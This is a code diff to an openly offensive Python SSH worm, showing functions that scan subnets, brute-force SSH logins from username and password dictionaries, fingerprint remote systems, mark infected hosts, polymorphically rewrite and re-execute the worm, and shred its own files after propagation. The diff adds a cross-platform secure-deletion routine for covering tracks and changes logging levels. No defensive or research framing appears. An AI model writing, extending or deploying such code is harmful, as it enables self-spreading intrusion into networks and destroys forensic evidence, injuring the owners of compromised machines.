@@ -54,7 +54,7 @@ INFECTED_LOG = "infected.log"
 USERNAME_DICT = "username.txt"
 PASSWORD_DICT = "password.txt"
 ALLOWED_SUBNETS = ["192.168.0.0/16", "10.0.0.0/16"]
-BLOCKED_SUBNETS = ["127.0.0.0/8", "169.254.0.0/16", "172.16.0.0/20", "224.0.0.0/4"]
+BLOCKED_SUBNETS = ["127.0.0.0/8", "169.254.0.0/16", "172.16.0.0/20", "224.0.0.0/4", "10.0.3.0/24"]
 MIN_SUBNET_MASK = 24
 
 # Logging configuration with a custom colorized formatter
@@ -189,16 +189,16 @@ def detect_remote_os(ssh):
             _, stdout, _ = ssh.exec_command("uname -s")
             remote_os = stdout.read().decode().strip()
             if remote_os:
-                logger.info(f"Detected remote OS via uname: {remote_os}")
+                logger.warning(f"Detected remote OS via uname: {remote_os}")
                 if "Linux" in remote_os or "Darwin" in remote_os:
                     return "Linux"
-            logger.info("Assuming remote OS is Windows")
+            logger.warning("Assuming remote OS is Windows")
             return "Windows"
         except Exception:
-            logger.info("Assuming remote OS is Windows")
+            logger.warning("Assuming remote OS is Windows")
             return "Windows"
     else:
-        logger.info(f"Detected remote OS via SSH banner: {passive_fingerprint}")
+        logger.warning(f"Detected remote OS via SSH banner: {passive_fingerprint}")
         return passive_fingerprint    
 
 def get_remote_home_dir(ssh, remote_os):
@@ -279,7 +279,7 @@ def initiate_worm():
     for subnet in final_subnets:
         hosts = scan_network(subnet, local_ips)
         shuffle(hosts)
-        logger.info(f"Discovered hosts: {hosts}")
+        logger.warning(f"Discovered hosts: {hosts}")
         logger.info("Attempting SSH connection...")
         for host in hosts:
             if allowed(IPAddress(host)):
@@ -611,7 +611,7 @@ def self_mutate():
     mutated_file = polymorph_file(current_file)
     mutated_file_path = os.path.join(os.path.dirname(current_file), mutated_file)
     os.chmod(mutated_file_path, 0o755)
-    logger.info(f"Self-mutation complete. New worm file: {mutated_file_path}")
+    logger.warning(f"Self-mutation complete. New worm file: {mutated_file_path}")
     
     # Replace the current process with the new mutated worm, passing the updated environment.
     for handler in logger.handlers:
@@ -628,29 +628,48 @@ def check_remote_infection_marker(ssh, remote_os):
     sftp.close()
     return True
 
+def secure_remove(file_path):
+    """
+    Securely removes a file. On Linux, uses the 'shred' command.
+    On Windows, overwrites the file with zeros before removing it.
+    """
+    if sys.platform.startswith("win"):
+        try:
+            with open(file_path, "r+b") as f:
+                length = os.path.getsize(file_path)
+                f.write(b'\x00' * length)
+            os.remove(file_path)
+            logger.info(f"Securely overwritten and removed {file_path} (Windows)")
+        except Exception as e:
+            logger.info(f"Error securely deleting {file_path} on Windows: {e}")
+    else:
+        try:
+            subprocess.check_call(["shred", "-u", file_path])
+            logger.info(f"Securely shredded and removed {file_path} (Linux)")
+        except Exception as e:
+            logger.info(f"Error running shred on {file_path}: {e}")
+
 def cleanup_scene():
     """
-    Securely clean up all files in the Temp directory using the 'shred' command,
-    then remove the Temp directory. This is intended to prevent recovery of the worm's files
+    Securely clean up all files in the Temp directory using a secure deletion method,
+    then remove the Temp directory. This prevents recovery of the worm's files
     after successful propagation.
     """
     temp_dir = os.path.join(HOME_DIR, REMOTE_DIR)
     if not os.path.exists(temp_dir):
         logger.info(f"Temp directory {temp_dir} does not exist. No cleanup needed.")
         return
+
     for filename in os.listdir(temp_dir):
         file_path = os.path.join(temp_dir, filename)
         if os.path.isfile(file_path):
-            try:
-                subprocess.check_call(["shred", "-u", file_path])
-                logger.info(f"Securely shredded and removed {file_path}")
-            except Exception as e:
-                logger.error(f"Failed to shred {file_path}: {e}")
+            secure_remove(file_path)
+
     try:
         os.rmdir(temp_dir)
         logger.info(f"Removed Temp directory {temp_dir}")
     except Exception as e:
-        logger.error(f"Failed to remove Temp directory {temp_dir}: {e}")
+        logger.info(f"Error when removing Temp directory {temp_dir}: {e}")
 
 def load_entries(filename):
     """Load credential or log entries from a file."""
